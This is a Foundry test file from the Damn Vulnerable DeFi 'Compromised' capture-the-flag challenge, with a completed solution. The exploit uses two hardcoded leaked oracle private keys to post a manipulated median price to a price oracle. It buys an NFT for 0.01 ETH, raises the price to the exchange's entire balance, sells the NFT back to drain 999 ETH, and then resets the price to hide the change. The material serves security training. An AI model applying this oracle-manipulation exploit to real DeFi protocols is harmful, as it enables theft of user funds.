// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    // uint256 rep of the private keys
    uint256 private constant PRIVATE_KEY_1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
    uint256 private constant PRIVATE_KEY_2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

    function setMedianPrice(uint256 amount) internal {
        // Get oracle addresses from private keys
        address oracle1 = vm.addr(PRIVATE_KEY_1);
        address oracle2 = vm.addr(PRIVATE_KEY_2);

        console.log("Oracle 1 address:", oracle1);
        console.log("Oracle 2 address:", oracle2);

        // Before
        uint256 currMedianPrice = oracle.getMedianPrice("DVNFT");
        console.log("Current median price is", currMedianPrice);

        // Post from oracle1
        console.log("Posting to oracle 1");
        vm.prank(oracle1);
        oracle.postPrice("DVNFT", amount);

        // After 1 oracle
        currMedianPrice = oracle.getMedianPrice("DVNFT");
        console.log("Current median price is", currMedianPrice);

        // Post from oracle2
        console.log("Posting to oracle 2");
        vm.prank(oracle2);
        oracle.postPrice("DVNFT", amount);

        // After 2 oracle
        currMedianPrice = oracle.getMedianPrice("DVNFT");
        console.log("Current median price is", currMedianPrice);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        /**
         * CODE YOUR EXPLOIT HERE
         */
        // Set price to 0.01 ether
        uint256 priceToSet = 0.01 ether;
        setMedianPrice(priceToSet);

        // Buy NFT as player
        vm.prank(player);
        exchange.buyOne{value: priceToSet}();

        // Verify ownership
        uint256 tokenId = 0;
        assertEq(nft.ownerOf(tokenId), player);
        console.log("Successfully purchased NFT");

        // Set price to exchange balance
        console.log("Setting price to balance of exchange");
        uint256 balOfExchange = address(exchange).balance;
        setMedianPrice(balOfExchange);

        // Sell NFT
        console.log("Selling NFT for the median price");
        vm.prank(player);
        nft.approve(address(exchange), tokenId);
        vm.prank(player);
        exchange.sellOne(tokenId);

        // Reset oracle price
        setMedianPrice(INITIAL_NFT_PRICE);

        //send funds to recovery
        vm.prank(player);
        (bool success,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
